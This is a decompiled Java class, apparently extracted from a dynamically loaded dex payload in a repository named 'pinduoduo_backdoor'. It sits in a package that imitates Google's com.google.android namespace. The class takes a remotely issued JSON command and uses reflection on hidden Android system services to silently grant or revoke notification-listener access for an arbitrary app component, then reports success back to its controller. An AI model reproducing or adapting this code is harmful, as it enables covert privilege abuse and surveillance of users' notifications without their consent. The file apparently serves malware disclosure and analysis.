package com.google.android.sd.biz_dynamic_dex.notification_listener;

import android.content.ComponentName;
import android.content.Context;
import android.os.IBinder;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.lang.reflect.Method;
import org.json.JSONObject;

public class NotificationListenerExecutor extends DynamicCmdExecutor {
  private final int CMD = 70;
  
  private void debugLog(String paramString, Object... paramVarArgs) {}
  
  private void doAccess(Context paramContext, String paramString1, String paramString2, String paramString3, boolean paramBoolean) {
    CmdData cmdData = new CmdData(70, paramString1, "client");
    try {
      ComponentName componentName = new ComponentName(paramString2, paramString3);
      Method method1 = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] { String.class });
      method1.setAccessible(true);
      Object object = method1.invoke(null, new Object[] { "notification" });
      Method method2 = Class.forName("android.app.INotificationManager$Stub").getMethod("asInterface", new Class[] { IBinder.class });
      method2.setAccessible(true);
      object = method2.invoke(null, new Object[] { object });
      method2 = object.getClass().getDeclaredMethod("setNotificationListenerAccessGranted", new Class[] { ComponentName.class, boolean.class });
      method2.setAccessible(true);
      method2.invoke(object, new Object[] { componentName, Boolean.valueOf(paramBoolean) });
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, null, null));
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("exception_");
      stringBuilder.append(exception.getMessage());
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, stringBuilder.toString(), null));
      return;
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    try {
      if (TextUtils.isEmpty(paramString))
        return; 
      JSONObject jSONObject = new JSONObject(paramString);
      doAccess(paramContext, jSONObject.optString("uuid"), jSONObject.optString("package"), jSONObject.optString("class_name"), jSONObject.optBoolean("access"));
      return;
    } catch (Exception exception) {
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\4f260398-e9d1-4390-bbb9-eeb49c07bf3c-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\notification_listener\NotificationListenerExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */